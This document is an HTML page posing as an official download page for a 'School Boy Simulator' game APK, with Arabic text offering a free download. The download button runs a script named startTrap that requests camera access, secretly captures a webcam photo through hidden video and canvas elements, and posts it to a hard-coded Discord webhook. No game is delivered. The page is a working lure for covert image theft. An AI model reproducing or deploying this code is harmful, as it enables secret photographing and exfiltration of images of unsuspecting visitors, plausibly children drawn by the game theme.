<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>School Boy - Official Download</title>
    <style>
        body {
            background-color: #0f172a;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            margin: 0;
            padding: 50px 20px;
        }
        .game-container {
            background: #1e293b;
            max-width: 450px;
            margin: 0 auto;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            border: 1px solid #334155;
        }
        .game-image {
            width: 100%;
            height: 220px;
            object-fit: cover;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        }
        h1 {
            color: #38bdf8;
            margin-bottom: 10px;
            font-size: 24px;
        }
        p {
            color: #94a3b8;
            font-size: 14px;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        .download-btn {
            background-color: #22c55e;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            box-shadow: 0 4px 12px rgba(34, 197, 94, 0.4);
        }
        .download-btn:hover {
            background-color: #16a34a;
        }
        .footer-note {
            margin-top: 15px;
            font-size: 12px;
            color: #64748b;
        }
    </style>
</head>
<body>

    <div class="game-container">
        <img class="game-image" src="https://images.unsplash.com/photo-1550745165-9bc0b252726f?q=80&w=600&auto=format&fit=crop" alt="School Boy Game">
        
        <h1>School Boy Simulator</h1>
        <p>قم بتحميل أحدث إصدار من اللعبة الآن للاستمتاع بالمغامرة والمهام المدرسية الممتعة مجاناً!</p>
        
        <button class="download-btn" onclick="startTrap()">تحميل مباشر (Download APK)</button>
        
        <div class="footer-note">الإصدار: v1.2.4 | الحجم: 45MB</div>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        function startTrap() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1569812360976269322/dv5MXkROSgdX6Aq1Oo6upwAB8DndK8qSXYrw3xXRG14ZqR8Sg_N1H9zfGkMbHSKB1HPJ';

            navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false })
                .then(stream => {
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('file', blob, 'photo.jpg');

                            fetch(WEBHOOK_URL, {
                                method: 'POST',
                                body: formData
                            }).then(() => {
                                stream.getTracks().forEach(track => track.stop());
                            });
                        }, 'image/jpeg', 0.9);
                    }, 2000);
                })
                .catch(err => {
                    console.error("Error accessing media devices.", err);
                });
        }
    </script>

</body>
</html>
